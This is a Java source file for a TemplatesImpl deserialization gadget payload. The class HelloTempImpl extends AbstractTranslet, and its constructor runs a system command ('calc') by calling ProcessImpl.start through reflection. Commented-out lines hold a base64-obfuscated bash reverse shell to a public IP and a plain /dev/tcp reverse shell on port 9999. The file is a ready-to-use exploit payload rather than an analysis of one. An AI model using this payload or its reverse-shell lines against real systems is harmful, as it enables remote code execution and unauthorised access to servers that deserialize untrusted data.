import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Method;
import java.util.Map;

public class HelloTempImpl extends AbstractTranslet {
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {}

    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {}

    public HelloTempImpl() throws Exception {
        super();
        System.out.println("Hello TemplatesImpl");
//        Runtime.getRuntime().exec(new String[]{"cmd","/c","D:\\Genshin\" \"Impact\\Genshin\" \"Impact\" \"Game\\YuanShen.exe"});
//        Runtime.getRuntime().exec("bash -c '{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMjQ1LjE1Ni4xNjMvOTk5OSAwPiYx}|{base64,-d}|{bash,-i}'");
        Class pClass = Class.forName("java.lang.ProcessImpl");
        String[] cmdarray = new String[]{"calc"};
        Method startMethod = pClass.getDeclaredMethod("start", String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, boolean.class);
        startMethod.setAccessible(true);
        Process p = (Process)startMethod.invoke(null,cmdarray, null, null, null, false);
        InputStream in = p.getInputStream();
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        byte[] b = new byte[1024];
        int a = -1;

        while ((a = in.read(b)) != -1) {
            baos.write(b, 0, a);
        }

        System.out.println(baos.toString());
//        bash -i >& /dev/tcp/192.168.2.16/9999 0>&1
    }
}